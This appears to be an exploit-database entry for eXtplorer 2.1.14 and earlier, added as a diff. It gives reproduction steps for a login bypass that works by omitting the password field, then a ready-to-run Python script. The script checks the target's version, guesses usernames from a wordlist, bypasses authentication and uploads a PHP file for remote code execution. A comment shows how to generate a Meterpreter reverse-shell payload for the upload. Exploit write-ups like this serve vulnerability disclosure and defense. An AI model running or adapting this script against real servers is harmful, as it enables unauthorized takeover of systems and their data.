@@ -1,0 +1,287 @@
+id: 38314
+date: 03/27/2023
+title: eXtplorer <= 2.1.14 - Authentication Bypass & Remote Code Execution Exploit
+author: ErPaciocco
+cves: 
+
+# Exploit Title: eXtplorer<= 2.1.14 - Authentication Bypass & Remote Code Execution (RCE)
+# Exploit Author: ErPaciocco
+# Author Website: https://erpaciocco.github.io
+# Vendor Homepage: https://extplorer.net/
+#
+#   Vendor:
+#   ==============
+#   extplorer.net
+#
+#   Product:
+#   ==================
+#   eXtplorer <= v2.1.14
+#
+#   eXtplorer is a PHP and Javascript-based File Manager, it allows to browse
+#   directories, edit, copy, move, delete,
+#   search, upload and download files, create & extract archives, create new
+#   files and directories, change file
+#   permissions (chmod) and more. It is often used as FTP extension for popular
+#   applications like Joomla.
+#
+#   Vulnerability Type:
+#   ======================
+#   Authentication Bypass (& Remote Command Execution)
+#
+#
+#   Vulnerability Details:
+#   =====================
+#
+#   eXtplorer authentication mechanism allows an attacker
+#   to login into the Admin Panel without knowing the password
+#   of the victim, but only its username. This vector is exploited
+#   by not supplying password in POST request.
+#
+#
+#   Tested on Windows
+#   
+#
+#   Reproduction steps:
+#   ==================
+#
+#   1) Navigate to Login Panel
+#   2) Intercept authentication POST request to /index.php
+#   3) Remove 'password' field
+#   4) Send it and enjoy!
+#
+#
+#   Exploit code(s):
+#   ===============
+#
+#   Run below PY script from CLI...
+#
+#   [eXtplorer_auth_bypass.py]
+#
+
+#   Proof Of Concept
+
+try:
+    import requests
+except:
+    print(f"ERROR: RUN: pip install requests")
+    exit()
+import sys
+import time
+import urllib.parse
+import re
+import random
+import string
+import socket
+import time
+import base64
+
+TARGET = None
+WORDLIST = None
+
+_BUILTIN_WL = [
+    'root',
+    'admin',
+    'test',
+    'guest',
+    'info',
+    'adm',
+    'user',
+    'administrator'
+    ]
+
+_HOST = None
+_PATH = None
+_SESSION = None
+_HEADERS = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
+             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+             'Accept-Language': 'it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3',
+             'Accept-Encoding': 'gzip, deflate, br',
+             'Connection': 'keep-alive' }
+
+def detect():
+        global _HOST
+        global _PATH
+        global _SESSION
+        global _HEADERS
+        
+        _HOST = TARGET[0].split(':')[0] + '://' + TARGET[0].split('/')[2]
+        _PATH = '/'.join(TARGET[0].split('/')[3:]).rstrip('/')
+        
+
+        
+        _SESSION = requests.Session()
+
+        raw = _SESSION.get(f"{_HOST}/{_PATH}/extplorer.xml", headers=_HEADERS, verify=False)
+
+        if raw.status_code == 200:
+            ver = re.findall("<version>(((\d+)\.?)+)<\/version>", raw.text, re.MULTILINE)
+            
+            if int(ver[0][2]) < 15:
+                return True
+
+        return False
+        
+
+def auth_bypass():
+    global _HOST
+    global _PATH
+    global _SESSION
+    global _HEADERS
+
+    global WORDLIST
+    global _BUILTIN_WL
+    
+    _HEADERS['X-Requested-With'] = 'XMLHttpRequest'
+    
+    params = {'option': 'com_extplorer',
+              'action': 'login',
+              'type': 'extplorer',
+              'username': 'admin',
+              'lang':'english'}
+
+    if WORDLIST != None:
+        if WORDLIST == _BUILTIN_WL:
+            info(f"Attempting to guess an username from builtin wordlist")
+            wl = _BUILTIN_WL
+        else:
+            info(f"Attempting to guess an username from wordlist: {WORDLIST[0]}")
+            with open(WORDLIST[0], "r") as f:
+                wl = f.read().split('\n')
+        for user in wl:
+            params = {'option': 'com_extplorer',
+                'action': 'login',
+                'type': 'extplorer',
+                'username': user,
+                'lang':'english'}
+
+            info(f"Trying with {user}")
+                    
+            res = _SESSION.post(f"{_HOST}/{_PATH}/index.php", data=params, headers=_HEADERS, verify=False)
+            if "successful" in res.text:
+                return (user)
+    else:
+        res = _SESSION.post(f"{_HOST}/{_PATH}/index.php", data=params, headers=_HEADERS, verify=False)
+
+    if "successful" in res.text:
+        return ('admin')
+
+    return False
+
+def rce():
+    global _HOST
+    global _PATH
+    global _SESSION
+    global _HEADERS
+    global _PAYLOAD
+    
+    tokenReq = _SESSION.get(f"{_HOST}/{_PATH}/index.php?option=com_extplorer&action=include_javascript&file=functions.js")
+    token = re.findall("token:\s\"([a-f0-9]{32})\"", tokenReq.text)[0]
+
+    info(f"CSRF Token obtained: {token}")
+
+    payload = editPayload()
+
+    info(f"Payload edited to fit local parameters")
+
+
+    params = {'option': 'com_extplorer',
+              'action': 'upload',
+              'dir': f"./{_PATH}",
+              'requestType': 'xmlhttprequest',
+              'confirm':'true',
+              'token': token}
+    name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+    files = {'userfile[0]':(f"{name}.php", payload)}
+    
+    req = _SESSION.post(f"{_HOST}/{_PATH}/index.php", data=params, files=files, verify=False)
+
+    if "successful" in req.text:
+        info(f"File {name}.php uploaded in root dir")
+        info(f"Now set a (metasploit) listener and go to: {_HOST}/{_PATH}/{name}.php")
+
+def attack():
+    if not TARGET:
+        error("TARGET needed")
+
+    if TARGET:
+        if not detect():
+            error("eXtplorer vulnerable instance not found!")
+            exit(1)
+        else:
+            info("eXtplorer endpoint is vulnerable!")
+            username = auth_bypass()
+            if username:
+                info("Auth bypassed!")
+                rce()
+            else:
+                error("Username 'admin' not found")
+
+def error(message):
+    print(f"[E] {message}")
+
+def info(message):
+    print(f"[I] {message}")
+
+def editPayload():
+    # You can generate payload with msfvenom and paste below base64 encoded result
+    # msfvenom -p php/meterpreter_reverse_tcp LHOST=<yourIP> LPORT=<yourPORT> -f base64
+    return base64.b64decode("PD9waHAgZWNobyAiSEFDS0VEISI7ICA/Pg==")
+
+def help():
+    print(r"""eXtplorer <= 2.1.14 exploit - Authentication Bypass & Remote Code Execution
+
+Usage:
+  python3 eXtplorer_auth_bypass.py -t <target-host> [-w <userlist>] [-wb]
+
+Options:
+  -t    Target host. Provide target IP address (and optionally port).
+  -w    Wordlist for user enumeration and authentication (Optional)
+  -wb   Use built-in wordlist for user enumeration (Optional)
+  -h    Show this help menu.
+""")
+    return True
+
+args = {"t" : (1, lambda *x: (globals().update(TARGET = x[0]))),
+        "w" : (1, lambda *x: (globals().update(WORDLIST = x[0]))),
+        "wb": (0, lambda *x: (globals().update(WORDLIST = _BUILTIN_WL))),
+        "h" : (0, lambda *x: (help() and exit(0)))}
+
+if __name__ == "__main__":
+    i = 1
+    [
+        args[ arg[1:]][1](sys.argv[i+1: (i:=i+1+args[arg[1:]][0]) ])
+        for arg in [k
+             for k in sys.argv[i:]
+        ]
+        if arg[0] == '-'
+    ]
+    attack()
+else:
+    help()
+        
+
+#   ///////////////////////////////////////////////////////////////////////
+
+#   [Script examples]
+#
+#
+#   c:\>python eXtplorer_auth_bypass.py -t https://target.com
+#   c:\>python eXtplorer_auth_bypass.py -t http://target.com:1234 -w wordlist.txt
+#   c:\>python eXtplorer_auth_bypass.py -t http://target.com -wb
+
+#   Exploitation Method:
+#   ======================
+#   Remote
+
+#   [+] Disclaimer
+#   The information contained within this advisory is supplied "as-is" with no
+#   warranties or guarantees of fitness of use or otherwise.
+#   Permission is hereby granted for the redistribution of this advisory,
+#   provided that it is not altered except by reformatting it, and
+#   that due credit is given. Permission is explicitly given for insertion in
+#   vulnerability databases and similar, provided that due credit
+#   is given to the author. The author is not responsible for any misuse of the
+#   information contained herein and accepts no responsibility
+#   for any damage caused by the use or misuse of this information.
+
+#  0day.today [2023-04-03]  #
